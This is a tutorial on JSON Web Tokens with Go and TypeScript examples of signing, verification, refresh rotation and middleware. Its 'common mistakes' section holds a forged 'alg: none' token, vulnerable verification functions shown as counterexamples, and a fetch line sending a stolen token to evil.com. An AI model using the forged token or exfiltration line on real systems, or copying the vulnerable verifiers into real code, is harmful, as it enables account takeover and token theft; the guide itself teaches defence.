# JSON Web Tokens (JWT)

## The Conference Badge

A JWT is like a conference badge. Your name, company, and access level are printed on it (claims). A holographic sticker proves it's legit (signature). Anyone can read the badge without calling the registration desk (stateless verification). But if someone steals your badge, they can use it until the conference ends (token expiry).

That's the fundamental tradeoff with JWTs: no server-side state means no server-side revocation. More on this tension later.

---

## JWT Structure

A JWT has three parts separated by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└──────── header ────────┘.└────────────────── payload ──────────────────┘.└──────── signature ────────┘
```

Each part is base64url encoded (not encrypted — anyone can decode it).

### Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The algorithm used for signing. Common values:
- `HS256` — HMAC with SHA-256 (symmetric key)
- `RS256` — RSA with SHA-256 (asymmetric key pair)
- `ES256` — ECDSA with P-256 and SHA-256 (asymmetric, smaller keys)
- `EdDSA` — Ed25519 (asymmetric, modern, fast)

### Payload (Claims)

```json
{
  "iss": "https://auth.example.com",
  "sub": "user_12345",
  "aud": "https://api.example.com",
  "exp": 1700000000,
  "iat": 1699996400,
  "nbf": 1699996400,
  "jti": "unique-token-id-abc",
  "role": "admin",
  "email": "alice@example.com"
}
```

**Registered claims (standardized):**

| Claim | Full Name | Purpose |
|-------|-----------|---------|
| `iss` | Issuer | Who created this token |
| `sub` | Subject | Who this token is about (user ID) |
| `aud` | Audience | Who this token is intended for |
| `exp` | Expiration | When this token expires (Unix timestamp) |
| `iat` | Issued At | When this token was created |
| `nbf` | Not Before | Token is not valid before this time |
| `jti` | JWT ID | Unique identifier to prevent replay |

**Custom claims** can be anything your application needs (`role`, `email`, `permissions`). Keep them minimal — every claim increases token size, and tokens are sent with every request.

### Signature

The signature is created by:
```
signature = ALGORITHM(
    base64url(header) + "." + base64url(payload),
    secret_or_private_key
)
```

The signature guarantees:
1. **Integrity** — the payload hasn't been modified
2. **Authenticity** — only someone with the key could have created this token

It does NOT provide:
- **Confidentiality** — the payload is readable by anyone (it's just base64, not encryption)
- **Revocability** — once issued, valid until expiry

---

## Signing Algorithms

### HMAC (Symmetric)

One secret key for both signing and verification. Think of it like a shared secret handshake — both parties need to know the same moves.

```
Server A (signs):    HMAC-SHA256("header.payload", shared_secret) → signature
Server B (verifies): HMAC-SHA256("header.payload", shared_secret) → same signature? ✓
```

**When to use:** Single server or tightly coupled services that can safely share a secret.

**Problem:** Every service that can verify can also create tokens. If any service is compromised, the attacker can forge tokens for the entire system.

### RSA / ECDSA / Ed25519 (Asymmetric)

Private key signs, public key verifies. Think of it like a wax seal — only the king has the seal ring (private key), but anyone can verify the impression (public key).

```
Auth Server (signs):     RSA_Sign("header.payload", private_key) → signature
API Server (verifies):   RSA_Verify("header.payload", signature, public_key) → valid? ✓
```

**When to use:** Distributed systems, microservices, any system where verifiers shouldn't be able to create tokens.

**Algorithm comparison:**

| Algorithm | Key Size | Signature Size | Speed | Notes |
|-----------|----------|----------------|-------|-------|
| RS256 | 2048+ bits | 256 bytes | Slow signing | Most widely supported |
| ES256 | 256 bits | 64 bytes | Fast | Smaller keys and signatures |
| EdDSA | 256 bits | 64 bytes | Fastest | Modern, recommended for new systems |

---

## JWT Creation and Verification

### Go (golang-jwt/jwt)

```go
package auth

import (
    "fmt"
    "os"
    "time"

    "github.com/golang-jwt/jwt/v5"
)

type CustomClaims struct {
    Role  string `json:"role"`
    Email string `json:"email"`
    jwt.RegisteredClaims
}

var jwtSecret = []byte(os.Getenv("JWT_SECRET"))

func CreateToken(userID string, role string, email string) (string, error) {
    if len(jwtSecret) == 0 {
        return "", fmt.Errorf("JWT_SECRET not configured")
    }

    now := time.Now()
    claims := CustomClaims{
        Role:  role,
        Email: email,
        RegisteredClaims: jwt.RegisteredClaims{
            Issuer:    "https://auth.example.com",
            Subject:   userID,
            Audience:  jwt.ClaimStrings{"https://api.example.com"},
            ExpiresAt: jwt.NewNumericDate(now.Add(15 * time.Minute)),
            IssuedAt:  jwt.NewNumericDate(now),
            NotBefore: jwt.NewNumericDate(now),
            ID:        generateTokenID(),
        },
    }

    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString(jwtSecret)
}

func VerifyToken(tokenString string) (*CustomClaims, error) {
    token, err := jwt.ParseWithClaims(
        tokenString,
        &CustomClaims{},
        func(token *jwt.Token) (interface{}, error) {
            if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
                return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
            }
            return jwtSecret, nil
        },
        jwt.WithIssuer("https://auth.example.com"),
        jwt.WithAudience("https://api.example.com"),
        jwt.WithValidMethods([]string{"HS256"}),
    )

    if err != nil {
        return nil, fmt.Errorf("invalid token: %w", err)
    }

    claims, ok := token.Claims.(*CustomClaims)
    if !ok || !token.Valid {
        return nil, fmt.Errorf("invalid claims")
    }

    return claims, nil
}
```

**Using asymmetric keys (Ed25519) in Go:**

```go
package auth

import (
    "crypto/ed25519"
    "fmt"
    "time"

    "github.com/golang-jwt/jwt/v5"
)

func CreateTokenAsymmetric(privateKey ed25519.PrivateKey, userID string) (string, error) {
    claims := jwt.RegisteredClaims{
        Issuer:    "https://auth.example.com",
        Subject:   userID,
        ExpiresAt: jwt.NewNumericDate(time.Now().Add(15 * time.Minute)),
        IssuedAt:  jwt.NewNumericDate(time.Now()),
    }

    token := jwt.NewWithClaims(jwt.SigningMethodEdDSA, claims)
    return token.SignedString(privateKey)
}

func VerifyTokenAsymmetric(publicKey ed25519.PublicKey, tokenString string) (*jwt.RegisteredClaims, error) {
    token, err := jwt.ParseWithClaims(
        tokenString,
        &jwt.RegisteredClaims{},
        func(token *jwt.Token) (interface{}, error) {
            if _, ok := token.Method.(*jwt.SigningMethodEd25519); !ok {
                return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
            }
            return publicKey, nil
        },
        jwt.WithValidMethods([]string{"EdDSA"}),
    )

    if err != nil {
        return nil, fmt.Errorf("invalid token: %w", err)
    }

    claims, ok := token.Claims.(*jwt.RegisteredClaims)
    if !ok || !token.Valid {
        return nil, fmt.Errorf("invalid claims")
    }

    return claims, nil
}
```

### TypeScript (jose)

```typescript
import * as jose from "jose";

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET);
const ISSUER = "https://auth.example.com";
const AUDIENCE = "https://api.example.com";

interface TokenPayload {
  sub: string;
  role: string;
  email: string;
}

async function createToken(payload: TokenPayload): Promise<string> {
  return new jose.SignJWT({ role: payload.role, email: payload.email })
    .setProtectedHeader({ alg: "HS256" })
    .setIssuer(ISSUER)
    .setAudience(AUDIENCE)
    .setSubject(payload.sub)
    .setIssuedAt()
    .setExpirationTime("15m")
    .sign(JWT_SECRET);
}

async function verifyToken(token: string): Promise<jose.JWTPayload> {
  const { payload } = await jose.jwtVerify(token, JWT_SECRET, {
    issuer: ISSUER,
    audience: AUDIENCE,
    algorithms: ["HS256"],
  });

  return payload;
}
```

**Using asymmetric keys (Ed25519) in TypeScript:**

```typescript
import * as jose from "jose";

async function setupKeys() {
  const { publicKey, privateKey } = await jose.generateKeyPair("EdDSA");
  return { publicKey, privateKey };
}

async function createTokenAsymmetric(
  privateKey: jose.KeyLike,
  userId: string,
  role: string
): Promise<string> {
  return new jose.SignJWT({ role })
    .setProtectedHeader({ alg: "EdDSA" })
    .setIssuer("https://auth.example.com")
    .setSubject(userId)
    .setIssuedAt()
    .setExpirationTime("15m")
    .sign(privateKey);
}

async function verifyTokenAsymmetric(
  publicKey: jose.KeyLike,
  token: string
): Promise<jose.JWTPayload> {
  const { payload } = await jose.jwtVerify(token, publicKey, {
    issuer: "https://auth.example.com",
    algorithms: ["EdDSA"],
  });

  return payload;
}
```

---

## When to Use JWTs (and When NOT To)

### Good Use Cases

**Stateless API authentication:** A mobile app or SPA sends a JWT with each API request. The API server verifies the signature without hitting a database. Good for horizontal scaling — any server instance can verify the token.

**Microservice communication:** Service A calls Service B with a JWT. Service B verifies the signature with the auth service's public key. No need for Service B to call the auth service on every request.

**Short-lived authorization:** "Allow this user to download this file for the next 5 minutes." Encode the permission and expiry in the token.

### Bad Use Cases (Use Sessions Instead)

**Web application sessions:** For traditional web apps, server-side sessions with cookies are simpler and more secure:
- Sessions can be revoked instantly (delete from Redis)
- JWTs can't be revoked until they expire
- Session cookies are smaller than JWTs
- HttpOnly cookies protect against XSS; localStorage does not

**Anything requiring immediate revocation:** If a user changes their password, gets banned, or their account is compromised, you need to invalidate their sessions immediately. With JWTs, you either wait for expiry or maintain a blocklist — which defeats the "stateless" purpose.

---

## Common JWT Mistakes

### 1. The "none" Algorithm Attack

Some JWT libraries accept `"alg": "none"`, which means no signature verification. An attacker changes the header to `"none"`, removes the signature, and the token is accepted.

**The attack:**

```
Original token:
  Header:  {"alg": "HS256", "typ": "JWT"}
  Payload: {"sub": "user_123", "role": "viewer"}
  Signature: <valid HMAC signature>

Forged token:
  Header:  {"alg": "none", "typ": "JWT"}
  Payload: {"sub": "user_123", "role": "admin"}
  Signature: <empty>
```

Base64url encode the modified header and payload, append a dot, and send:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJhZG1pbiJ9.
```

**Go — Vulnerable:**

```go
func verifyTokenVulnerable(tokenString string) (*jwt.Token, error) {
    return jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
        return jwtSecret, nil
    })
}
```

**Go — Secure:**

```go
func verifyTokenSecure(tokenString string) (*jwt.Token, error) {
    return jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
            return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
        }
        return jwtSecret, nil
    }, jwt.WithValidMethods([]string{"HS256"}))
}
```

**TypeScript — Vulnerable:**

```typescript
async function verifyVulnerable(token: string) {
  const decoded = jose.decodeJwt(token);
  return decoded;
}
```

**TypeScript — Secure:**

```typescript
async function verifySecure(token: string) {
  const { payload } = await jose.jwtVerify(token, JWT_SECRET, {
    algorithms: ["HS256"],
  });
  return payload;
}
```

Always explicitly whitelist allowed algorithms. Never trust the `alg` header from the token itself.

### 2. Algorithm Confusion Attack

If a server uses RSA (asymmetric), an attacker might change the algorithm to HMAC and sign with the RSA public key (which is public). The server sees `"alg": "HS256"`, uses the key from its config (the public key) as the HMAC secret, and the verification succeeds.

**Defense:** Always check the algorithm type matches what you expect:

```go
func(token *jwt.Token) (interface{}, error) {
    if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
        return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
    }
    return publicKey, nil
}
```

### 3. Storing JWTs in localStorage

```javascript
localStorage.setItem("token", jwt);
```

Any JavaScript running on your page can read localStorage. If your application has an XSS vulnerability, the attacker can steal the token:

```javascript
fetch("https://evil.com/steal?token=" + localStorage.getItem("token"));
```

**Better: HttpOnly cookies.** JavaScript can't read HttpOnly cookies, so even with XSS, the token is protected.

```typescript
res.cookie("token", jwt, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 900000,
});
```

### 4. Not Validating Issuer and Audience

If you don't check `iss` and `aud`, a token from one service can be used on another:

```go
jwt.ParseWithClaims(tokenString, claims, keyFunc,
    jwt.WithIssuer("https://auth.example.com"),
    jwt.WithAudience("https://api.example.com"),
)
```

Without these checks, a token issued by `https://other-app.com` would be accepted.

### 5. Using Symmetric Keys in Distributed Systems

If your auth server and 10 API servers all share the same HMAC secret, any compromised API server can forge tokens. Use asymmetric keys instead — only the auth server has the private key.

---

## Token Refresh Pattern

Short-lived access tokens (15 minutes) minimize the window of exposure if stolen. Refresh tokens allow getting new access tokens without re-authentication.

```
┌──────────┐              ┌──────────────┐              ┌───────────────┐
│  Client   │              │  API Server  │              │  Auth Server  │
└─────┬─────┘              └──────┬───────┘              └───────┬───────┘
      │                          │                              │
      │ Request + Access Token   │                              │
      │─────────────────────────>│                              │
      │                          │ Verify signature + expiry    │
      │<── 200 OK ──────────────│                              │
      │                          │                              │
      │ ... 15 minutes later ... │                              │
      │                          │                              │
      │ Request + Expired Token  │                              │
      │─────────────────────────>│                              │
      │<── 401 Unauthorized ────│                              │
      │                          │                              │
      │ POST /refresh + Refresh Token ────────────────────────>│
      │                          │                    Validate  │
      │                          │                    Issue new  │
      │<── New Access Token + New Refresh Token ───────────────│
      │                          │                              │
      │ Retry Request + New Access Token                        │
      │─────────────────────────>│                              │
      │<── 200 OK ──────────────│                              │
```

**Go Refresh Token Implementation:**

```go
func refreshHandler(w http.ResponseWriter, r *http.Request) {
    refreshToken := r.FormValue("refresh_token")
    if refreshToken == "" {
        http.Error(w, "Missing refresh token", http.StatusBadRequest)
        return
    }

    stored, err := getStoredRefreshToken(refreshToken)
    if err != nil {
        http.Error(w, "Invalid refresh token", http.StatusUnauthorized)
        return
    }

    if stored.ExpiresAt.Before(time.Now()) {
        deleteRefreshToken(refreshToken)
        http.Error(w, "Refresh token expired", http.StatusUnauthorized)
        return
    }

    if stored.Used {
        revokeAllTokensForUser(stored.UserID)
        http.Error(w, "Token reuse detected", http.StatusUnauthorized)
        return
    }

    markRefreshTokenUsed(refreshToken)

    newAccessToken, err := CreateToken(stored.UserID, stored.Role, stored.Email)
    if err != nil {
        http.Error(w, "Token creation failed", http.StatusInternalServerError)
        return
    }

    newRefreshToken, err := createRefreshToken(stored.UserID)
    if err != nil {
        http.Error(w, "Refresh token creation failed", http.StatusInternalServerError)
        return
    }

    json.NewEncoder(w).Encode(map[string]string{
        "access_token":  newAccessToken,
        "refresh_token": newRefreshToken,
    })
}
```

Notice the refresh token rotation: each refresh token can only be used once. If the same refresh token is used twice, it means either the legitimate user or an attacker has a copy — revoke everything for safety.

**TypeScript Refresh Token Implementation:**

```typescript
app.post("/refresh", async (req, res) => {
  const { refresh_token } = req.body;

  if (typeof refresh_token !== "string") {
    return res.status(400).json({ error: "Missing refresh token" });
  }

  const stored = await getStoredRefreshToken(refresh_token);
  if (!stored) {
    return res.status(401).json({ error: "Invalid refresh token" });
  }

  if (stored.expiresAt < new Date()) {
    await deleteRefreshToken(refresh_token);
    return res.status(401).json({ error: "Refresh token expired" });
  }

  if (stored.used) {
    await revokeAllTokensForUser(stored.userId);
    return res.status(401).json({ error: "Token reuse detected" });
  }

  await markRefreshTokenUsed(refresh_token);

  const newAccessToken = await createToken({
    sub: stored.userId,
    role: stored.role,
    email: stored.email,
  });

  const newRefreshToken = await createRefreshToken(stored.userId);

  res.json({
    access_token: newAccessToken,
    refresh_token: newRefreshToken,
  });
});
```

---

## JWT Middleware Pattern

**Go:**

```go
func JWTMiddleware(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        authHeader := r.Header.Get("Authorization")
        if authHeader == "" {
            http.Error(w, "Missing authorization header", http.StatusUnauthorized)
            return
        }

        parts := strings.SplitN(authHeader, " ", 2)
        if len(parts) != 2 || parts[0] != "Bearer" {
            http.Error(w, "Invalid authorization header format", http.StatusUnauthorized)
            return
        }

        claims, err := VerifyToken(parts[1])
        if err != nil {
            http.Error(w, "Invalid token", http.StatusUnauthorized)
            return
        }

        ctx := context.WithValue(r.Context(), "claims", claims)
        next.ServeHTTP(w, r.WithContext(ctx))
    }
}
```

**TypeScript:**

```typescript
async function jwtMiddleware(
  req: Request,
  res: Response,
  next: NextFunction
) {
  const authHeader = req.headers.authorization;
  if (!authHeader) {
    return res.status(401).json({ error: "Missing authorization header" });
  }

  const parts = authHeader.split(" ");
  if (parts.length !== 2 || parts[0] !== "Bearer") {
    return res.status(401).json({ error: "Invalid authorization format" });
  }

  try {
    const payload = await verifyToken(parts[1]);
    req.user = payload;
    next();
  } catch {
    return res.status(401).json({ error: "Invalid token" });
  }
}
```

---

## Summary: JWT Decision Checklist

| Question | If Yes | If No |
|----------|--------|-------|
| Need immediate token revocation? | Use sessions | JWT is fine |
| Multiple services verify tokens? | Use asymmetric keys | HMAC is simpler |
| Storing in browser? | Use HttpOnly cookies | Never use localStorage |
| Sensitive data in payload? | Encrypt (JWE) or don't put it there | Standard JWT |
| Microservice-to-microservice? | JWT with short expiry | Mutual TLS is an alternative |

JWTs are a tool, not a silver bullet. They solve the stateless verification problem elegantly. But if you need features like revocation, session management, or storing sensitive data, you'll end up reimplementing half of what server-side sessions give you for free. Choose the right tool for the job.
